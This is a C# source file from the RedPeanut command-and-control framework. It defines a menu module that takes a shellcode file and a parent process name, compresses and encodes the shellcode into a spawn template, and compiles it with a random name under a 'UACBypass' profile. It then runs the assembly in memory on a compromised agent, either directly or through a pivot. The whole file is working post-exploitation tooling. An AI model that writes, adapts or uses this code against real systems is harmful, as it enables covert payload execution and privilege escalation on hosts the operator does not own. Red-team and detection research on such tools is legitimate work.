//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using static RedPeanut.Models;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class SpawnShellcodeManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set process", "Parent process" },
            { "set filename", "File to read shellcode" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "piddagent";
        string process = "";
        string filename = "";

        bool exit = false;

        public SpawnShellcodeManager()
        {

        }

        public SpawnShellcodeManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                WmiMenu(input);
            } while (!exit);
        }

        private void WmiMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set process":
                            process = GetParsedSetString(input);
                            break;
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            try
            {
                string host = ((AgentInstanceHttp)agent).GetAddress();
                int port = ((AgentInstanceHttp)agent).GetPort();
                int profileid = ((AgentInstanceHttp)agent).GetProfileid();
                int targetframework = ((AgentInstanceHttp)agent).TargetFramework;
                string pipename = "";

                if (agent.Pivoter != null)
                {
                    host = agent.Pivoter.SysInfo.Ip;
                    port = 0;
                    profileid = RedPeanutC2.server.GetDefaultProfile();
                    targetframework = agent.TargetFramework;
                    pipename = agent.AgentId;
                }
                else
                {
                    host = ((AgentInstanceHttp)agent).GetAddress();
                    port = ((AgentInstanceHttp)agent).GetPort();
                    profileid = ((AgentInstanceHttp)agent).GetProfileid();
                    targetframework = agent.TargetFramework;
                }

                string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profileid))
                {
                    string source;

                    string binfilepath = Path.Combine(folderrpath, SHELLCODE_FOLDER, filename);

                    source = File.ReadAllText(Path.Combine(folderrpath, SPAWN_TEMPLATE))
                    .Replace("#NUTCLR#", null)
                    .Replace("#TASK#", null)
                    .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profileid).Spawn)
                    .Replace("#SHELLCODE#", Convert.ToBase64String(CompressGZipAssembly(File.ReadAllBytes(binfilepath))))
                    .Replace("#USERNAME#", null)
                    .Replace("#PASSWORD#", null)
                    .Replace("#DOMAIN#", null)
                    .Replace("#PROCESS#", process);

                    string spawnprocess = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework, compprofile: CompilationProfile.UACBypass)));
                    RunAssemblyBase64(
                        spawnprocess,
                        "RedPeanutSpawn",
                        new string[] { " " },
                        agent);

                }
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error generating task");
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "process", process }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
